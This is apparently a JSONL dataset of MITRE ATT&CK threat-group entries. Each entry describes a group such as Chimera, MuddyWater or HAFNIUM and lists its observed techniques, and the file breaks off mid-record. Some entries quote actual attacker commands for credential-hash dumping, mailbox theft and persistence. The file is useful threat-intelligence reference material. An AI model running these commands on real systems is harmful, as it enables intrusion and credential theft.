{"text": " [TEMP.Veles](https://attack.mitre.org/groups/G0088) is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing [TRITON](https://attack.mitre.org/software/S0609), a malware framework designed to manipulate industrial safety systems.(Citation: FireEye TRITON 2019)(Citation: FireEye TEMP.Veles 2018)(Citation: FireEye TEMP.Veles JSON April 2019)", "idx": "https://attack.mitre.org/groups/G0088", "title": "TEMP.Veles", "entity": "TEMP.Veles", "entity_type": "groups", "entity_context": ["TEMP.Veles has used a VPN to persist in the victim environment.", "TEMP.Veles utilized RDP throughout an operation.\t", "TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them.", "TEMP.Veles has used port 443 for C2.", "TEMP.Veles has used compromised VPN accounts.\t", "TEMP.Veles has relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.", "TEMP.Veles has created staging folders in directories that were infrequently used by legitimate users or processes.", "TEMP.Veles has used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.", "TEMP.Veles has used scheduled task XML triggers.", "TEMP.Veles has used Virtual Private Server (VPS) infrastructure.", "TEMP.Veles has obtained and used tools such as Mimikatz and PsExec.", "TEMP.Veles has planted Web shells on Outlook Exchange servers.", "TEMP.Veles has used Mimikatz and a custom tool, SecHack, to harvest credentials. ", "TEMP.Veles has modified and added entries within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code> to maintain persistence.\t\n", "TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools.", "TEMP.Veles has renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.\n", "TEMP.Veles has modified files based on the open-source project cryptcat in an apparent attempt to decrease AV detection rates.", "TEMP.Veles has used a publicly-available PowerShell-based tool, WMImplant. The group has also used PowerShell to perform Timestomping."], "is_subtechnique": false}
{"text": " [Suckfly](https://attack.mitre.org/groups/G0039) is a China-based threat group that has been active since at least 2014. (Citation: Symantec Suckfly March 2016)", "idx": "https://attack.mitre.org/groups/G0039", "title": "Suckfly", "entity": "Suckfly", "entity_type": "groups", "entity_context": ["Suckfly has used stolen certificates to sign its malware.", "Several tools used by Suckfly have been command-line driven.", "Suckfly used a signed credential-dumping tool to obtain victim account credentials.", "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.", "Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open."], "is_subtechnique": false}
{"text": " The [Windigo](https://attack.mitre.org/groups/G0124) group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the [Ebury](https://attack.mitre.org/software/S0377) SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, [Windigo](https://attack.mitre.org/groups/G0124) operators continued updating [Ebury](https://attack.mitre.org/software/S0377) through 2019.(Citation: ESET Windigo Mar 2014)(Citation: CERN Windigo June 2019)", "idx": "https://attack.mitre.org/groups/G0124", "title": "Windigo", "entity": "Windigo", "entity_type": "groups", "entity_context": ["Windigo has used a script to check for the presence of files created by OpenSSH backdoors.", "Windigo has distributed Windows malware via drive-by downloads.", "Windigo has used a Perl script for information gathering.", "Windigo has used a script to detect installed software on targeted systems.", "Windigo has used a script to detect which Linux distribution and version is currently installed on the system.", "Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.", "Windigo has delivered a generic Windows proxy Win32/Glubteta.M. Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure."], "is_subtechnique": false}
{"text": " [MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)", "idx": "https://attack.mitre.org/groups/G0069", "title": "MuddyWater", "entity": "MuddyWater", "entity_type": "groups", "entity_context": ["MuddyWater has used malware that can capture screenshots of the victim’s machine.", "MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.", "MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.", "MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.", "MuddyWater has used malware that leveraged WMI for execution and querying host information.", "MuddyWater has used web services including OneHub to distribute remote access tools.", "MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.", "MuddyWater can disable the system's local proxy settings.", "MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code.", "MuddyWater has used developed tools in Python including Out1.", "MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine.", "MuddyWater has used malware to obtain a list of running processes on the system.", "MuddyWater has sent targeted spearphishing e-mails with malicious links.", "MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.", "MuddyWater has used malware that can upload additional files to the victim’s machine.", "MuddyWater has used C2 infrastructure to receive exfiltrated data.", "MuddyWater has added Registry Run key <code>KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding</code> to establish persistence.", "MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.", "MuddyWater uses various techniques to bypass UAC.", "MuddyWater has distributed URLs in phishing e-mails that link to lure documents.", "MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).", "MuddyWater has used a legitimate application, ScreenConnect, to manage systems remotely and move laterally. ", "MuddyWater has performed credential dumping with Mimikatz and procdump64.exe.", "MuddyWater has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.\t ", "MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.", "MuddyWater decoded base64-encoded PowerShell commands using a VBS file.", "MuddyWater has used malware that can collect the victim’s username.", "MuddyWater has used JavaScript files to execute its POWERSTATS payload.", "MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers.", "MuddyWater has used file sharing services including OneHub to distribute tools.", "MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros.", "MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.", "MuddyWater has used HTTP for C2 communications.", "MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.", "MuddyWater has used PowerShell for execution.", "MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back. ", "MuddyWater has used scheduled tasks to establish persistence.", "MuddyWater has specifically targeted government agency employees with spearphishing e-mails.\t ", "MuddyWater has used malware that can execute PowerShell scripts via DDE.", "MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.", "MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"", "MuddyWater has used tools to encode C2 communications including Base64 encoding.", "MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.\t ", "MuddyWater has used malware to collect the victim’s IP address and domain name.", "MuddyWater has run a tool that steals passwords saved in victim email.", "MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.", "MuddyWater has used <code>cmd.exe net user /domain</code> to enumerate domain users.", "MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.", "MuddyWater has used a Word Template, Normal.dotm, for persistence.", "MuddyWater has used a custom tool for creating reverse shells.", "MuddyWater has used malware that can collect the victim’s OS version and machine name.", "MuddyWater has made use of  legitimate tools ConnectWise and RemoteUtilities for access to target environments.", "MuddyWater has performed credential dumping with LaZagne."], "is_subtechnique": false}
{"text": " [Dust Storm](https://attack.mitre.org/groups/G0031) is a threat group that has targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. (Citation: Cylance Dust Storm)", "idx": "https://attack.mitre.org/groups/G0031", "title": "Dust Storm", "entity": "Dust Storm", "entity_type": "groups", "entity_context": ["Dust Storm has used Android backdoors capable of enumerating specific files on the infected devices.", "Dust Storm has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.", "Dust Storm has used Android backdoors capable of exfiltrating specific files directly from the infected devices."], "is_subtechnique": false}
{"text": " [Chimera](https://attack.mitre.org/groups/G0114) is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry.(Citation: Cycraft Chimera April 2020)(Citation: NCC Group Chimera January 2021)", "idx": "https://attack.mitre.org/groups/G0114", "title": "Chimera", "entity": "Chimera", "entity_type": "groups", "entity_context": ["Chimera has used Windows admin shares to move laterally.", "Chimera has used HTTPS for C2 communications.", "Chimera has cleared event logs on compromised hosts.", "Chimera has used <code>net user</code> for account discovery.", "Chimera has used WinRM for lateral movement.", "Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.", "Chimera has collected data of interest from network shares.", "Chimera has harvested data from remote mailboxes including through execution of <code>\\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost</code>.", "Chimera has used <code>net start</code> and <code>net use</code> for system service discovery.", "Chimera has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.", "Chimera has used a valid account to maintain persistence via scheduled task.", "Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.\t", "Chimera has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.", "Chimera has harvested data from victim's e-mail including through execution of <code>wmic /node:<ip> process call create \"cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\<path>\\<username>\\My Documents\\<filename>.pst\"\ncopy</code>.", "Chimera has staged stolen data locally on compromised hosts.", "Chimera has used WMIC to execute remote commands.", "Chimera has used Cobalt Strike to encapsulate C2 in DNS traffic.", "Chimera has remotely copied tools and malware onto targeted systems.", "Chimera has used <code>time /t</code> and <code>net time \\\\ip/hostname</code> for system time discovery.", "Chimera has used <code>net localgroup administrators</code> to identify  accounts with local administrative rights.", "Chimera has gathered the SYSTEM registry and ntds.dit files from target systems. Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via <code>cmsadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv</code> and used ntdsutil to copy the Active Directory database.", "Chimera has used Cobalt Strike C2 beacons for data exfiltration. ", "Chimera has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.", "Chimera has collected documents from the victim's SharePoint.", "Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.", "Chimera has utilized various scans and queries to find domain controllers and remote services in the target environment.", "Chimera has used PsExec to deploy beacons on compromised systems.", "Chimera has has used <code>net user /dom</code> and <code>net user Administrator</code> to enumerate domain accounts including administrator accounts.", "Chimera has <code>nltest /domain_trusts</code> to identify domain trust relationships.", "Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.", "Chimera has used direct Windows system calls by leveraging Dumpert.", "Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script <code>schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st</code> and to maintain persistence.", "Chimera has performed file deletion to evade detection. ", "Chimera has used the <code>get -b <start ip> -e <end ip> -p</code> command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.", "Chimera has encoded PowerShell commands.\t", "Chimera has queried Registry keys using <code>reg query \\\\<host>\\HKU\\<SID>\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers</code> and <code>reg query \\\\<host>\\HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings</code>.", "Chimera has used the NtdsAudit utility to collect information related to accounts and passwords.", "Chimera has used <code>net share</code> and <code>net view</code> to identify network shares of interest.", "Chimera has used RDP to access targeted systems.", "Chimera has used compromised domain accounts to gain access to the target environment.", "Chimera has used <code>tasklist</code> to enumerate processes.", "Chimera has used <code>type \\\\<hostname>\\c$\\Users\\<username>\\Favorites\\Links\\Bookmarks bar\\Imported From IE\\*citrix*</code> for bookmark discovery.", "Chimera has used custom DLLs for continuous retrieval of data from memory.", "Chimera has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec.", "Chimera has used a Windows version of the Linux <code>touch</code> command to modify the date and time stamp on DLLs.", "Chimera has used the <code>quser</code> command to show currently logged on users. ", "Chimera has used <code>fsutil</code>, <code>fsinfo drives systeminfo</code>, and <code>vssadmin list shadows</code> for sytesm information including shadow volumes and drive information.", "Chimera has used ipconfig, Ping, and <code>tracert</code> to enumerate the IP address and network environment and settings of the local host.", "Chimera has dumped password hashes for use in pass the hash authentication attacks.", "Chimera has used <code>netstat -ano | findstr EST</code> to discover network connections.", "Chimera has exfiltrated stolen data to OneDrive accounts.", "Chimera has used the Windows Command Shell and batch scripts for execution on compromised hosts.", "Chimera has copied tools between compromised hosts using SMB.", "Chimera has staged stolen data on designated servers in the target environment.", "Chimera has utilized multiple commands to identify data of interest in file and directory listings.", "Chimera has used credential stuffing against victim's remote services to obtain valid accounts.", "Chimera has used side loading to place malicious DLLs in memory.", "Chimera has collected credentials for the target organization from previous breaches for use in brute force attacks.", "Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential.\t"], "is_subtechnique": false}
{"text": " [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019)", "idx": "https://attack.mitre.org/groups/G0060", "title": "BRONZE BUTLER", "entity": "BRONZE BUTLER", "entity_type": "groups", "entity_context": ["BRONZE BUTLER has used a tool to capture screenshots.", "BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement.", "BRONZE BUTLER has used PowerShell for execution.", "BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware.", "BRONZE BUTLER has used <code>net user /domain</code> to identify account information.", "BRONZE BUTLER has placed malware on file shares and given it the same name as legitimate documents on the share.", "BRONZE BUTLER has used VBS and VBE scripts for execution.", "BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.", "The BRONZE BUTLER uploader or malware the uploader uses <code>command</code> to delete the RAR archives after they have been exfiltrated.", "BRONZE BUTLER has exfiltrated files stolen from file shares.", "BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.", "BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks.", "BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget).", "BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.", "BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement.", "BRONZE BUTLER has exfiltrated files stolen from local systems.", "BRONZE BUTLER typically use <code>ping</code> and Net to enumerate systems.", "BRONZE BUTLER downloads encoded payloads and decodes them on the victim.", "BRONZE BUTLER has used TROJ_GETVERSION to discover system services.", "BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims.", "BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.", "BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF.", "BRONZE BUTLER has used tools to enumerate software installed on an infected host.", "BRONZE BUTLER has obtained and used open-source tools such as Mimikatz, gsecdump, and Windows Credential Editor.", "BRONZE BUTLER has made use of Python-based remote access tools.", "BRONZE BUTLER malware has used HTTP for C2.", "BRONZE BUTLER has used steganography in multiple operations to conceal malicious payloads.", "Several BRONZE BUTLER tools encode data with base64 when posting it to a C2 server.", "BRONZE BUTLER has used batch scripts and the command-line interface for execution.", "BRONZE BUTLER has used <code>net time</code> to check the local time on a target system.", "BRONZE BUTLER downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.", "BRONZE BUTLER has used legitimate applications to side-load malicious DLLs.", "BRONZE BUTLER has used various tools (such as Mimikatz and WCE) to perform credential dumping.", "BRONZE BUTLER has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.", "BRONZE BUTLER has compressed data into password-protected RAR archives prior to exfiltration.", "BRONZE BUTLER has incorporated code into several tools that attempts to terminate anti-virus processes.", "BRONZE BUTLER has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.", "BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads.", "BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence.", "BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server."], "is_subtechnique": false}
{"text": " [Silent Librarian](https://attack.mitre.org/groups/G0122) is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of [Silent Librarian](https://attack.mitre.org/groups/G0122) are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC).(Citation: DOJ Iran Indictments March 2018)(Citation: Phish Labs Silent Librarian)(Citation: Malwarebytes Silent Librarian October 2020)", "idx": "https://attack.mitre.org/groups/G0122", "title": "Silent Librarian", "entity": "Silent Librarian", "entity_type": "groups", "entity_context": ["Silent Librarian has exfiltrated entire mailboxes from compromised accounts.", "Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.", "Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.", "Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.", "Silent Librarian has established e-mail accounts to receive e-mails forwarded from compromised accounts.", "Silent Librarian has collected lists of names for individuals from targeted organizations.", "Silent Librarian has collected e-mail addresses from targeted organizations from open Internet searches.", "Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.", "Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages.", "Silent Librarian has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ.", "Silent Librarian has set up auto forwarding rules on compromised e-mail accounts.", "Silent Librarian has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. Silent Librarian has also made use of a variety of URL shorteners for these staged websites.", "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts."], "is_subtechnique": false}
{"text": " [Andariel](https://attack.mitre.org/groups/G0138) is a North Korean state-sponsored threat group that has been active since at least 2009. [Andariel](https://attack.mitre.org/groups/G0138) has primarily focused its operations--which have included destructive attacks--against South Korean government agencies, military organizations, and a variety of domestic companies; they have also conducted cyber financial operations against ATMs, banks, and cryptocurrency exchanges. [Andariel](https://attack.mitre.org/groups/G0138)'s notable activity includes Operation Black Mine, Operation GoldenAxe, and Campaign Rifle.(Citation: FSI Andariel Campaign Rifle July 2017)(Citation: IssueMakersLab Andariel GoldenAxe May 2017)(Citation: AhnLab Andariel Subgroup of Lazarus June 2018)(Citation: TrendMicro New Andariel Tactics July 2018)(Citation: CrowdStrike Silent Chollima Adversary September 2021) [Andariel](https://attack.mitre.org/groups/G0138) is considered a sub-set of [Lazarus Group](https://attack.mitre.org/groups/G0032), and has been attributed to North Korea's Reconnaissance General Bureau.(Citation: Treasury North Korean Cyber Groups September 2019) North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.", "idx": "https://attack.mitre.org/groups/G0138", "title": "Andariel", "entity": "Andariel", "entity_type": "groups", "entity_context": ["Andariel has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data.", "Andariel has hidden malicious executables within PNG files.", "Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments.", "Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.", "Andariel has used <code>tasklist</code> to enumerate processes and find a specific string.", "Andariel has used the <code>netstat -naop tcp</code> command to display TCP connections on a victim's machine.", "Andariel has attempted to lure victims into enabling malicious macros within email attachments.", "Andariel has exploited numerous ActiveX vulnerabilities, including zero-days.", "Andariel has downloaded additional tools and malware onto compromised hosts.", "Andariel has collected large numbers of files from compromised network systems for later extraction.", "Andariel has limited its watering hole attacks to specific IP address ranges.", "Andariel has used a variety of publicly-available remote access Trojans (RATs) for its operations."], "is_subtechnique": false}
{"text": " [HAFNIUM](https://attack.mitre.org/groups/G0125) is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. [HAFNIUM](https://attack.mitre.org/groups/G0125) primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.(Citation: Microsoft HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021)", "idx": "https://attack.mitre.org/groups/G0125", "title": "HAFNIUM", "entity": "HAFNIUM", "entity_type": "groups", "entity_context": ["HAFNIUM has used ASCII encoding for C2 traffic.", "HAFNIUM has exfiltrated data to file sharing sites, including MEGA.", "HAFNIUM has collected e-mail addresses for users they intended to target.", "HAFNIUM has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and ASPXSpy.", "HAFNIUM has used <code>rundll32</code> to load malicious DLLs.", "HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host. ", "HAFNIUM has used 7-Zip and WinRAR to compress stolen files for exfiltration.", "HAFNIUM has acquired web services for use in C2 and exfiltration.", "HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.", "HAFNIUM has used open-source C2 frameworks, including Covenant.", "HAFNIUM has stolen copies of the Active Directory database (NTDS.DIT).", "HAFNIUM has operated from leased virtual private servers (VPS) in the United States.", "HAFNIUM has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.", "HAFNIUM has used <code>procdump</code> to dump the LSASS process memory.", "HAFNIUM has used the Exchange Power Shell module <code>Set-OabVirtualDirectoryPowerShell</code> to export mailbox data.", "HAFNIUM has used TCP for C2.", "HAFNIUM has interacted with Office 365 tenants to gather details regarding target's environments.", "HAFNIUM has obtained IP addresses for publicly-accessible Exchange servers.", "HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.", "HAFNIUM has used web shells to export mailbox data.", "HAFNIUM has created and granted privileges to domain accounts."], "is_subtechnique": false}
{"text": " [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) is a cyber espionage threat group that has been active since at least 2017. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) has targeted Ministries of Foreign Affairs and telecommunication companies in Africa, Europe, the Middle East, and Asia.(Citation: ESET BackdoorDiplomacy Jun 2021)", "idx": "https://attack.mitre.org/groups/G0135", "title": "BackdoorDiplomacy", "entity": "BackdoorDiplomacy", "entity_type": "groups", "entity_context": ["BackdoorDiplomacy has dropped implants in folders named for legitimate software.", "BackdoorDiplomacy has downloaded additional files and tools onto a compromised host.", "BackdoorDiplomacy has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. BackdoorDiplomacy has also exploited mis-configured Plesk servers.", "BackdoorDiplomacy has copied files of interest to the main drive's recycle bin.", "BackdoorDiplomacy has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.", "BackdoorDiplomacy has used an executable to detect removable media, such as USB flash drives.", "BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.", "BackdoorDiplomacy has executed DLL search order hijacking.", "BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.", "BackdoorDiplomacy has disguised their backdoor droppers with naming conventions designed to blend into normal operations.", "BackdoorDiplomacy has obfuscated tools and malware it uses with VMProtect.", "BackdoorDiplomacy has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.", "BackdoorDiplomacy has used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.", "BackdoorDiplomacy has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.", "BackdoorDiplomacy has used web shells to establish an initial foothold and for lateral movement within a victim's system."], "is_subtechnique": false}
{"text": " [FIN10](https://attack.mitre.org/groups/G0051) is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations. (Citation: FireEye FIN10 June 2017)", "idx": "https://attack.mitre.org/groups/G0051", "title": "FIN10", "entity": "FIN10", "entity_type": "groups", "entity_context": ["FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key.", "FIN10 has executed malicious .bat files containing PowerShell commands.", "FIN10 has used Meterpreter to enumerate users on remote systems.", "FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.", "FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence.", "FIN10 has relied on publicly-available software to gain footholds and establish persistence in victim environments.", "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.", "FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.", "FIN10 has used batch scripts and scheduled tasks to delete critical system files.", "FIN10 has used RDP to move laterally to systems in the victim environment.", "FIN10 has moved laterally using the Local Administrator account."], "is_subtechnique": false}
{"text": " [GALLIUM](https://attack.mitre.org/groups/G0093) is a group that has been active since at least 2012, primarily targeting high-profile telecommunications networks. [GALLIUM](https://attack.mitre.org/groups/G0093) has been identified in some reporting as likely a Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors.(Citation: Cybereason Soft Cell June 2019)(Citation: Microsoft GALLIUM December 2019)", "idx": "https://attack.mitre.org/groups/G0093", "title": "GALLIUM", "entity": "GALLIUM", "entity_type": "groups", "entity_context": ["GALLIUM used WinRAR to compress and encrypt stolen data prior to exfiltration.", "GALLIUM used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as <code>ping</code> to identify remote systems.", "GALLIUM used <code>reg</code> commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.", "GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.", "GALLIUM used <code>ipconfig /all</code> to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers.", "GALLIUM has used Taiwan-based servers that appear to be exclusive to GALLIUM.", "GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.", "GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry.", "GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration.", "GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.", "GALLIUM used <code>whoami</code> and <code>query user</code> to obtain information about the victim user.", "GALLIUM established persistence for PoisonIvy by created a scheduled task.", "GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.", "GALLIUM used the Windows command shell to execute commands.", "GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data.", "GALLIUM created high-privileged domain user accounts to maintain access to victim networks.", "GALLIUM used a modified version of HTRAN to redirect connections between networks.", "GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine.", "GALLIUM leveraged valid accounts to maintain access to a victim network.", "GALLIUM compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.", "GALLIUM used a renamed cmd.exe file to evade detection.", "GALLIUM has used PsExec to move laterally between hosts in the target network.", "GALLIUM has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.", "GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.", "GALLIUM used <code>netstat -oan</code> to obtain information about the victim network connections.", "GALLIUM has used stolen certificates to sign its tools including those from Whizzimo LLC.", "GALLIUM used dumped hashes to authenticate to other machines via pass the hash.", "GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines.", "GALLIUM ensured each payload had a unique hash, including by using different types of packers.", "GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.", "GALLIUM packed some payloads using different types of packers, both known and custom."], "is_subtechnique": false}
{"text": " [Machete](https://attack.mitre.org/groups/G0095) is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on Venezuela, but also in the US, Europe, Russia, and parts of Asia. [Machete](https://attack.mitre.org/groups/G0095) generally targets high-profile organizations such as government institutions, intelligence services, and military units, as well as telecommunications and power companies.(Citation: Cylance Machete Mar 2017)(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020)", "idx": "https://attack.mitre.org/groups/G0095", "title": "Machete", "entity": "Machete", "entity_type": "groups", "entity_context": ["Machete has created scheduled tasks to maintain Machete's persistence.", "Machete has sent phishing emails that contain a link to an external server with ZIP and RAR archives.", " Machete has delivered spearphishing emails that contain a zipped file with malicious contents.", "Machete has embedded malicious macros within spearphishing attachments to download additional files.", "Machete has has relied on users opening malicious links delivered 